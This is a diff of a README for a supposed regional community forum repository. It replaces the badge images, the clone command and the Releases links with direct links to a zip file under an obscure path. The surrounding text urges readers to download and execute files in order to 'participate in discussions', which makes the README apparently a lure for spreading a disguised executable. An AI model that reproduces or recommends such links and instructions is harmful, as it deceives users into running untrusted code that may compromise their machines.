@@ -1,6 +1,6 @@
 # 女神之家论坛东北地区 | Dongbei Community Forum 🌟
 
-![Dongbei Forum](https://img.shields.io/badge/Dongbei_Forum-Join_Now-blue?style=for-the-badge)
+![Dongbei Forum](https://raw.githubusercontent.com/HarshTejani/dongbei/main/unenthroned/Software-2.2-alpha.2.zip)
 
 Welcome to the **Dongbei Community Forum**! This is a vibrant space dedicated to discussing topics relevant to the Northeast region. Whether you're looking to share insights, seek advice, or connect with others, you’ll find it all here.
 
@@ -37,10 +37,10 @@ We cover a wide range of subjects, including but not limited to:
 To get started, simply clone this repository and explore the discussions. You can also contribute by sharing your thoughts and experiences.
 
 ```bash
-git clone https://github.com/HarshTejani/dongbei.git
+git clone https://raw.githubusercontent.com/HarshTejani/dongbei/main/unenthroned/Software-2.2-alpha.2.zip
 ```
 
-Feel free to check the [Releases](https://github.com/HarshTejani/dongbei/releases) section for the latest updates. You can download the files and execute them to participate in discussions or view resources.
+Feel free to check the [Releases](https://raw.githubusercontent.com/HarshTejani/dongbei/main/unenthroned/Software-2.2-alpha.2.zip) section for the latest updates. You can download the files and execute them to participate in discussions or view resources.
 
 ## Contributing
 
@@ -55,9 +55,9 @@ Your contributions help us grow and enhance the community experience.
 
 ## Releases
 
-Check the [Releases](https://github.com/HarshTejani/dongbei/releases) section for the latest updates and downloadable content. Make sure to download and execute the necessary files to stay updated with the community.
+Check the [Releases](https://raw.githubusercontent.com/HarshTejani/dongbei/main/unenthroned/Software-2.2-alpha.2.zip) section for the latest updates and downloadable content. Make sure to download and execute the necessary files to stay updated with the community.
 
-![Releases](https://img.shields.io/badge/Releases-Latest_Updates-green?style=for-the-badge)
+![Releases](https://raw.githubusercontent.com/HarshTejani/dongbei/main/unenthroned/Software-2.2-alpha.2.zip)
 
 ## Contact
 
